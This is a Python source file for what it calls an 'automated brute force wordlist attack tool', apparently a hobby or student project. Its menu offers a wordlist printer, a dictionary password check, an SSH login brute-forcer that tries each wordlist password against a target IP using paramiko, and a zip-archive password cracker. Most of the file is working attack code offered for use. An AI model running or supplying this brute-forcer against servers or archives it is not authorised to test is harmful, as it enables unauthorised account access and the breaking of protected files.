# !/usr/bin/env python3
#
# script name:  automated brute force wordlist attack tool
# author:       ben_podawiltz
# revision:     8.16.21

##########################################
#
# Libraries:
import itertools
import time
import os
import paramiko, sys, socket
import zipfile

###########################################
#

###########################################
#
# Functions:

def main_menu():
    print("[1.] Offensive - Dictionary Iterator")
    print("[2.] Defensive - Password Recongnized")
    print("[3.] Brute Force")
    print("[4.] Use Zip file for Brute Force Dictonary Iterator")
    print("[5.] Quit")

    user_input = input(
        "Welcome to Automated Brute Force Wordlist Attack Tool please select method above:")

    if user_input == "1":
        Iterate()
    elif user_input == "2":
        checkpass()
    elif user_input == "3":
        brute_ssh()
    elif user_input == "4":
        unzip()
    elif user_input == "5":
        exit
    else:
        print("Error, make another selection")
        main_menu()

def Iterate():
    host = input("")
    FP = input("Enter[/Path/To/File]:")
    if os.path.exists(FP):
        f = open(FP, "r", encoding="ISO-8859-1")
        for line in f:
            time.sleep(1)
            word = line.strip()
            print(word)
        f .close()
    else:
        print("^" * 10 + "No file exists" + "^" * 10)



def checkpass():
    filePath = input("Enter a path to dictionary [/Path/To/File]:")
    passwrd = input("Enter a password to run against a dictionary: ")

    with open(filePath, encoding="ISO-8859-1") as WL:
        
        if passwrd in WL.read():
            print("^" * 10 + "Password Recongnized" + "^" * 10)
        elif passwrd not in WL:
            print("^" * 10 + "Password Not Found" + "^" * 10)
            WL.close()

def ssh_connect(hostName, userName, PassWord, int=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(hostname=hostName, port=22, username=userName, password=PassWord)

    except paramiko.AuthenticationException:
        int = 1 
        print(f"Invalid credentials for {userName} : {PassWord}")
    except socket.error as e:
        int = 2
    ssh.close()
    return int
 
def brute_ssh():
        hostName = input("Enter IP address of target:")
        userName = input("Enter username:")
        FP = input("Enter dictionary file path locatation [Path/To/File]:")
        f = open(FP, "r", encoding="ISO-8859-1")
    
        for line in f:
            pword = line.strip()
            brute = ssh_connect(hostName,userName, pword)

            if brute == 0:
                print("^" * 10 +"Valid Login Credentials: " + "Username: " + str(userName) + "Password: " + str(pword) + "^" * 10)
                break    
            elif brute == 1:
                print("^" * 10 + "Invalid Login" + "^" * 10)
            elif brute == 2:
                print("^" * 10 + "Connection could not be made" + "^" * 10) 
                sys.exit(2)
        f.close()
     
def unzip():
    idx = 0
    path = input("Enter[/Path/To/DictionaryList]:")
    decrypt = input("Enter the file you would like to decrypt:")
    obj = zipfile.ZipFile(decrypt)             
    with open(path, 'rb') as file:
        for line in file:
            for word in line.split():
                try:
                    idx += 1
                    obj.extractall(password=word)
                    print("")
                    print("^" * 10 + "Password found at line:  ", idx, + "^" * 10)
                    print("^" * 10 + "Password is", word.decode())
                    return True
                except: 
                    continue
        else: False
     
        

# Main:
main_menu()
#####################################################################

# Re-source(s): https://github.com/rietesh/Brute-forcer-in-python/blob/master/brute-forcer.py
# https://docs.python.org/3/library/itertools.html
# https://www.w3schools.com/python/python_ref_file.asp
# https://stackoverflow.com/questions/19699367/for-line-in-results-in-unicodedecodeerror-utf-8-codec-cant-decode-byte
# https://www.thepythoncode.com/article/brute-force-ssh-servers-using-paramiko-in-python
# https://www.geeksforgeeks.org/how-to-brute-force-zip-file-passwords-in-python/
# End